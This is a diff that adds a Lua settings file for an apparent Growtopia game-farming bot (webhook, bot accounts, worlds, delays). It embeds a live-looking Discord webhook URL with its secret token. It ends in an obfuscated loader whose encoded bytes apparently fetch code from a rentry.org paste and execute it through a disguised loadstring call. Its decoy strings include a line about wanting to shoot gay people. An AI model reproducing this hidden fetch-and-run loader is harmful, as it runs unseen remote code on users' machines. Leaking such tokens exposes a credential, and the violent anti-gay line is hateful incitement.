@@ -1,0 +1,78 @@
+
+-- WEBHOOOK
+disable_webhook         = true -- set to true if your RDP potato
+YourDiscordid           = "929073845221081198"
+webhookdc               = "https://discord.com/api/webhooks/1101040617909403688/fvGtxcTOEbzEkfQMPm2_5iZ40qCsyLtJIRFrVBf_sSG8pZJ619KjDViH_u6F1Psb5Y-C"
+
+-- ==================== BOT SETTING ======================================
+-- example, your current bot using growid 'Zitus', then you fill password of growid 'zitus'
+passwordBot             = " " -- Optional if you dont fill password bot will use auto reconnnect by using connect() not remove addbot
+use_proxy_socks5        = false
+proxy                   = "ip:port:username:pass"
+
+-- MODE PNB use GAUT/WITHOUT GAUT/RETRIEVE
+mode                    = false -- false = MODE PNB, true = MODE RETRIEVE mode
+ignore_gems             = false -- false = not use gaut, true = use gaut
+
+-- RETRIEVE SETTING
+dropBlock_toOtherWorld  = true
+world_block             = "YEDE4"
+id_world_block          = "1019"
+posX_block              = 50 -- IF YOU MAKE DROP SEED TO OTHER WORLD = FALSE, you need set Coordinate x, y for bot drop seed
+posY_block              = 24
+retrieve_count          = 200
+timer_retrieve          = 100000
+
+-- GENERAL SETTING
+botList                 = {"kurohv20", "kurohv22"} -- Example usage : {"Bot1", "Bot2", "Bot3", "Bot4"}
+max_people              = 10        -- set max people in a world
+afk_duration            = 300000    -- 5 minutes = 300000
+move_direction          = 1 -- left = -1, right = 1
+collect_range           = 3
+trashList               = {5040, 5042, 5044, 5032, 5034, 5036, 5038, 5024, 5026, 5028, 5030, 7162, 7164}
+
+-- DELAY SETTING
+delay_collect           = 80 -- set to 50-100 if using mode without mode and block like Sorcerer stone 
+delay_place             = 80 -- delay place block/background bot
+move_interval           = 200 -- default SAFE
+move_range              = 3 -- default SAFE
+delay_pnb               = 200 -- default 200
+delay_buypack           = 6000 -- default 6000
+
+-- SETTING TAKE BLOCK CAN FROM OTHER WORLD
+takeBlock_fromOtherworld= true -- set to true if want take block from other world
+world_takeBlock         = "YEDE4"
+id_worldTake            = "1019"
+
+-- SETTING PNB
+break_block             = true
+break_background        = false
+break_mode              = "up"  -- 2 mode : up, down
+worlds                  = {"YEDEANBUI"}
+door_id_pnb             = "7019"
+block_id                = 4584 -- item id block_id
+world_start             = 1
+
+pnb_posX                = 38--  POS COORDINAT FOLLOWING GROWTOPIA ORIGINAL APP (NOT MULTIBOT COORD)
+pnb_posY                = 24 --  POS COORDINAT FOLLOWING GROWTOPIA ORIGINAL APP (NOT MULTIBOT COORD)
+
+-- SETTING SEED WORLD
+dropseed_to_otherworld  = true
+world_seed              = "BONGLAI"
+id_world_seed           = "7019"
+-- IF YOU MAKE DROP SEED TO OTHER WORLD = FALSE, you need set Coordinate x, y for bot drop seed
+posX_seed               = 50 --  POS COORDINAT FOLLOWING GROWTOPIA ORIGINAL APP (NOT MULTIBOT COORD)
+posY_seed               = 24 --  POS COORDINAT FOLLOWING GROWTOPIA ORIGINAL APP (NOT MULTIBOT COORD)
+
+-- SETTING PACK
+buy_pack                = true
+world_pack              = "YEDESAVE3"
+id_world_pack           = "5019"
+pack_name               = "world_lock"
+price_pack              = 2000
+maxgems                 = 10000
+packitemid              = {242}
+
+--=========================================================================
+
+key=[[Zitus]];cvqnbgkmfmdgzjxzxwyffqypyhrurkwhosgemnbnskhiuhmbykoxppqqxxravqxdgymijbddnffdydxfsuzffzjbuezswopenrmgfjjejwhzzeovdbfoqqbdpnyulkox='om jangan decrypt aku :((';hrncvlmfsrzzfvzkwzyvosksjmlohrxjqmszrqvjavedsoqeiztlcjhoasxwcqsvzogiowrtgyfjcczpuhumddysusmkxtqsacdwyyhqvwyzhnrhkphoiwnlpqccjsqy='Obfuscator Ini Milik Zitus';luqmqconwbrvnsimhpudnslgievrgvetheviftzgzxeqdtbybejmmnokzywuhgjwgxamqgqgrpimkhtbusghlphetdicwmigpokbiusdsxxvliwbckkubfjpfjuuiwxj='Kamu Nyari Load?';ppyahekjhtvhhknmpumtsbqapohxrydogbmsvxhukwsjgfpcuczvylxtdebyfrqbejfmyqnbqnrbnncrbekvpvjrhgddyaaymzohzopinkslkfnxcuicfwlurjsdrfpx='Saya Tak Ragu Ingin Nembak Gay People';jxhkpcxgdcuejtlqwoacmmvpuuibacknraffurtdppwbhphguvmgzfnukaexcdzybvczhgulmrpbgqhcjwlqppwymrulovmqglnmbonmtkrsjnzmzfrqpeqeabjupldc="Soeharto is first indonesian president. Jokowi is seventh indonesian's president, Itadori Yuuji is one of main character in Jujutsu Kaisen Anime, Kento Nanami is Side Character On Jujutsu Kaisen Anime. Lava is 1 of the most dangerous liquid in the world (cap)";gfejgvtgncfginoqzxsvobxicdhgwvkhlajxakxkuabjtcdrnesvlzwoeabtnptbiorvonlkfoakasvbminunezegmhlmlhzozmgfnmzbgegwhnlutefuryarejpywuv={ 1,80,3,107,156,197,177,164,80,105,227,93,90,106,90,84,88,88,200,166,80,80,80,80,80,80,80,80,80,80,80,120,199,144,81,289,144,147,138,172,165,195,181,194,195,172,145,180,189,185,190,185,195,196,194,177,196,191,194,172,148,191,199,190,188,191,177,180,195,172,180,179,178,191,196,195,179,125,198,129,172,195,179,194,185,192,196,172,192,190,178,172,191,178,182,197,195,179,177,196,181,180,172,192,190,178,175,190,197,194,191,190,126,188,197,177,213,222,80,80,83,225,95,208,80,81,91,80,80,82,94,80,80,83,148,80,81,82,219,80,80,85,222,80,81,86,98,80,84,81,98,208,87,88,228,208,80,90,276,80,82,82,95,80,89,81,219,80,80,91,91,81,80,89,94,81,82,92,276,80,82,82,276,80,81,81,279,80,81,80,221,84,219,191,199,190,181,194,202,185,196,197,195,84,216,155,165,162,159,152,166,131,84,219,152,196,196,192,147,188,185,181,190,196,84,212,190,181,199,84,215,189,181,196,184,191,180,84,215,157,181,196,184,191,180,84,212,183,181,196,84,212,197,194,188,84,245,184,196,196,192,195,138,127,127,194,181,190,196,194,201,126,191,194,183,127,192,190,178,190,197,194,191,190,198,129,181,190,179,127,194,177,199,84,217,194,181,195,192,191,190,195,181,84,216,194,181,193,197,181,195,196,84,213,188,191,177,180,84,213,178,191,180,201,209,80,80,80,208,225,82,81,80,80,81,80,80,81,82,80,80,81,80,80,80,80,81,208,209,215,179,188,185,181,190,196,212,225,209,213,175,149,158,166};local nau = 'load'; function anmhejvyvbqmkrvcofvhaphpusrhnshsytqtkfbddkhiuvdnqyaxagfrighukaoxrniebycgkekiuumgastuwbjzvdwlzuctipiqvbfystgssbwrjzxjxsqooyvhbgcg(...) local kyfxkdbmwebosltsxpeylzgpbrfnblolbzocyfhbjezvnyexaiejmyxxixbnulqneepefesypsppyrripffupqfqapmetmofwkjcfarsjfmxuwsgxrufhgzieuyksncl='';for zqefcvhendwxudaavdgyckmcenacajpsczytpwcfukqrlkxfyrybhwfbradaziiatsvtdovbyhyzskpmlgrsgahpbkhtwuvthlqhrxuydghruwyskciarlaeoabwefum=1, #gfejgvtgncfginoqzxsvobxicdhgwvkhlajxakxkuabjtcdrnesvlzwoeabtnptbiorvonlkfoakasvbminunezegmhlmlhzozmgfnmzbgegwhnlutefuryarejpywuv do if zqefcvhendwxudaavdgyckmcenacajpsczytpwcfukqrlkxfyrybhwfbradaziiatsvtdovbyhyzskpmlgrsgahpbkhtwuvthlqhrxuydghruwyskciarlaeoabwefum>3 then kyfxkdbmwebosltsxpeylzgpbrfnblolbzocyfhbjezvnyexaiejmyxxixbnulqneepefesypsppyrripffupqfqapmetmofwkjcfarsjfmxuwsgxrufhgzieuyksncl=kyfxkdbmwebosltsxpeylzgpbrfnblolbzocyfhbjezvnyexaiejmyxxixbnulqneepefesypsppyrripffupqfqapmetmofwkjcfarsjfmxuwsgxrufhgzieuyksncl.._ENV['\115\116\114\105\110\103']['\99\104\97\114']((gfejgvtgncfginoqzxsvobxicdhgwvkhlajxakxkuabjtcdrnesvlzwoeabtnptbiorvonlkfoakasvbminunezegmhlmlhzozmgfnmzbgegwhnlutefuryarejpywuv[zqefcvhendwxudaavdgyckmcenacajpsczytpwcfukqrlkxfyrybhwfbradaziiatsvtdovbyhyzskpmlgrsgahpbkhtwuvthlqhrxuydghruwyskciarlaeoabwefum]-gfejgvtgncfginoqzxsvobxicdhgwvkhlajxakxkuabjtcdrnesvlzwoeabtnptbiorvonlkfoakasvbminunezegmhlmlhzozmgfnmzbgegwhnlutefuryarejpywuv[2]));end end;local tolan = 'loadstring';_ENV[_ENV['\115\116\114\105\110\103']['\99\104\97\114'](hrncvlmfsrzzfvzkwzyvosksjmlohrxjqmszrqvjavedsoqeiztlcjhoasxwcqsvzogiowrtgyfjcczpuhumddysusmkxtqsacdwyyhqvwyzhnrhkphoiwnlpqccjsqy:lower():sub(18,18):byte(),cvqnbgkmfmdgzjxzxwyffqypyhrurkwhosgemnbnskhiuhmbykoxppqqxxravqxdgymijbddnffdydxfsuzffzjbuezswopenrmgfjjejwhzzeovdbfoqqbdpnyulkox:lower():sub(1,1):byte(),ppyahekjhtvhhknmpumtsbqapohxrydogbmsvxhukwsjgfpcuczvylxtdebyfrqbejfmyqnbqnrbnncrbekvpvjrhgddyaaymzohzopinkslkfnxcuicfwlurjsdrfpx:lower():sub(-9,-9):byte(),jxhkpcxgdcuejtlqwoacmmvpuuibacknraffurtdppwbhphguvmgzfnukaexcdzybvczhgulmrpbgqhcjwlqppwymrulovmqglnmbonmtkrsjnzmzfrqpeqeabjupldc:lower():sub(21,21):byte())](kyfxkdbmwebosltsxpeylzgpbrfnblolbzocyfhbjezvnyexaiejmyxxixbnulqneepefesypsppyrripffupqfqapmetmofwkjcfarsjfmxuwsgxrufhgzieuyksncl)(); end;anmhejvyvbqmkrvcofvhaphpusrhnshsytqtkfbddkhiuvdnqyaxagfrighukaoxrniebycgkekiuumgastuwbjzvdwlzuctipiqvbfystgssbwrjzxjxsqooyvhbgcg(gfejgvtgncfginoqzxsvobxicdhgwvkhlajxakxkuabjtcdrnesvlzwoeabtnptbiorvonlkfoakasvbminunezegmhlmlhzozmgfnmzbgegwhnlutefuryarejpywuv);
